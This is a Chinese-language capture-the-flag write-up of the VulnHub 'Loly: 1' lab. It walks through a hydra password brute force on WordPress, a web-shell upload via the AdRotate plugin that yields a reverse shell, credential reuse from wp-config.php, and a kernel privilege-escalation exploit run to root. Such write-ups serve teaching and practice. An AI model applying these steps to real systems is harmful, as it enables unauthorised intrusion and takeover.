# Loly: 1

2024-5-22 https://www.vulnhub.com/entry/loly-1,538/

difficulty: Easy

## IP

192.168.10.184

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
```

gobuster 扫描出 http://192.168.10.184/wordpress/

wpscan 扫描出一个用户:loly

尝试找到登陆密码，访问登陆页面，提示 Unknown host: loly.lc，看样子需要把 loly.lc 添加到/etc/hosts 中。

hydra 进行密码爆破：

```
hydra -t 20 -l loly -P ~/tools/dict/rockyou.txt 192.168.10.184 -f http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.10.184%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username loly is incorrect"
```

找到了 loly 的密码:fernando

theme 没上传接口，左侧菜单发现了一个插件 Adrotate，估计会有漏洞，进行搜索。

http://loly.lc/wordpress/wp-admin/admin.php?page=adrotate-media 中可以上传 zip，然后插件会自动解压。把 web shell 打包上传。

访问下面连接，就会触发反弹 shell，在 kali 上监听 8888 端口：

```
curl http://loly.lc/wordpress/wp-content/banners/8888.php
```

得到了反弹的 shell，先升级下 tty，开始进行系统枚举。

sudo，suid，crontab、cap 都没发现特殊的程序。

/home 目录中有 loly 目录，其中有一个 clean.py：

```
www-data@ubuntu:/home/loly$ cat cleanup.py
import os
import sys
try:
	os.system('rm -r /tmp')
except:
	sys.exit()
```

看到 rm 没有使用绝对路径，可能存在程序替换执行的漏洞。

在 www-data@ubuntu:~/html/wordpress$ cat wp-config.php 中发现数据库配置密码：

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
define( 'DB_HOST', 'localhost' );
```

或许这个数据库密码，就是 loly 的用户密码，su 尝试切换到 loly，输入密码 lolyisabeautifulgirl ，切换成功。

cleanup.py 应该是被 root 用户定时调用，但是目前看不到定时信息，只有先修改 cleanup.py 中的内容，等待 root 用户触发，但是 tmp 目录中一直没有生成我们想要的结果，估计这里是坑，其他的信息没有搜集到，最后只能看看有没有内核漏洞。

uname -a Linux ubuntu 4.4.0-31

searchsploit 找到 Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010.c

下载到目标机器上编译执行：

```
loly@ubuntu:~$ gcc 45010.c -o exp
loly@ubuntu:~$ ./exp
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)
# cd /root
# cat root.txt
  ____               ____ ____  ____
 / ___| _   _ _ __  / ___/ ___||  _ \
 \___ \| | | | '_ \| |   \___ \| |_) |
  ___) | |_| | | | | |___ ___) |  _ <
 |____/ \__,_|_| |_|\____|____/|_| \_\

Congratulations. I'm BigCityBoy

```
